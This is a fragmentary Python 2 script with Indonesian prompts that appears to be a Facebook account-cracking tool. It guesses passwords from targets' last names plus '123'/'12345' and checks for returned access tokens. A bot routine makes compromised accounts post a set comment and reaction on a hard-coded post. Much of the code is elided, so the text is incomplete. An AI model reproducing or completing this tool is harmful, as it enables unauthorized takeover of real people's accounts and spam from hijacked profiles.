...
def pilih_masuk():
	msuk = raw_input("\033[1;90m︻デ═一▸ Duarr \033[91m:\033[1;92m ")
	if msuk =="":
...
def bot_komen():
	...
	una = ('100052292505058')
	kom = ('Siap Untuk Ngehek Krah Krah')
	reac = ('LOVE')
	post = ('185535143199568')
	post2 = ('185535143199568')
	kom2 = ('Halo Bang Andre❤️')
	reac2 = ('ANGRY')
...
######PILIH######
def pilih():
	unikers = raw_input("\033[1;92m︻デ═一▸Duarr \033[91m:\033[1;92m ")
	if unikers =="":
														...
														if 'www.facebook.com' in ko['error_msg']:
															...
															if 'access_token' in ko:
																...
																if 'www.facebook.com' in ko['error_msg']:
																	...
																	bos8 = j['last_name'].lower()+'123'+'12345'
...
#### PILIH BANGLADESH ####
def pilih_bangla():
	teak = raw_input("\033[1;96m︻デ═一▸ Duarr \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m} Isi Yg Benar Tolol !"
		pilih_bangla()
	elif teak =="1" or teak =="01":
